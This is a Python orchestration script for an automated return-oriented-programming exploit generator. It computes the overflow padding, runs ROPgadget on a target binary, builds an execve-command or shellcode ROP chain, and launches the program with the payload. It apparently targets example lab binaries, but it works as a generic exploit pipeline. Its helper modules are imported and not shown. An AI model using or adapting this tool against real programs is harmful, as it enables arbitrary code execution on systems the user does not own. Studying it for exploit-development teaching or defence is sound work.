#!/usr/local/bin/python3

from Shellcode_Chain_Generator import generate_shellcode_chain
from PaddingFinder.padding_finder import getPaddingLength
from Function_Extractor import extract_functions
from Execve_Chain_Generator import generate_execve_chain

import sys
import argparse
import subprocess
from pathlib import Path

parser = argparse.ArgumentParser(
    description="",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
)
parser.add_argument("-p", "--program", default=Path("Examples/Vuln3/Vuln3-32/vuln3-32"))
parser.add_argument("--ROPgadget-path", default=Path("/usr/local/bin/ROPgadget"))
parser.add_argument("--command", default=None)
parser.add_argument("--envp", default="")
parser.add_argument("--shellcode", default=None)

parser.add_argument("--out-rop-path", default=None)
parser.add_argument("--padding", default=None)


def main(args):

    # Check command line arguments are valid

    if (args.shellcode is None) and (args.command is None):
        print("Invalid arguments. Must provide either a command to execute with execve (--command) or a path to shellcode (--shellcode).")
        sys.exit()

    # Get padding

    print("Finding padding...")
    if args.padding is None:
        args.padding = getPaddingLength(args.program)[0]
    print("Padding found!")

    # Call ROPGadget

    if args.out_rop_path is None:
        print("Executing ROPgadget...")
        command = str(args.ROPgadget_path) + " --binary " + str(args.program) + " --ropchain > out-rop.txt"
        try:
            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, universal_newlines=True)
            print("ROPgadget executed successfully!")
            print("Return code:", result.returncode)
            print("Output:\n", result.stdout)
        except subprocess.CalledProcessError as e:
            print("Error executing ROPgadget. Return code:", e.returncode)
            print("Error output:", e.output)
        args.out_rop_path = Path("out-rop.txt")

    # Extract functions

    print("Extracting functions and .data address from ROPgadget output...")
    data_address, _ = extract_functions(args.out_rop_path)
    print("Functions and .data address extracted!")

    # Generate exploit (Execve_Command OR Shell_Code)

    if args.command is not None:
        print("Generating execve based exploit...")
        exploit_path = generate_execve_chain(args.padding, data_address, args.command, args.envp)
        print("Exploit generated!")
    elif args.shellcode is not None:
        print("Generating shellcode based exploit...")
        exploit_path = generate_shellcode_chain(args.padding, args.out_rop_path, args.shellcode)
        print("Exploit generated!")

    # Run the program with the exploit

    print("Running program with exploit...")
    command = "./" + str(args.program) + " " + str(exploit_path)
    try:
        process = subprocess.Popen(command, shell=True, universal_newlines=True)
        process.wait()
        print("Program executed successfully.")
        print("Return code:", process.returncode)
        print("Output:\n", process.stdout)
    except subprocess.CalledProcessError as e:
        print("Error executing the program. Return code:", e.returncode)
        print("Error output:", e.output)
    args.out_rop_path = Path("out-rop.txt")


if __name__ == "__main__":
    main(parser.parse_args())
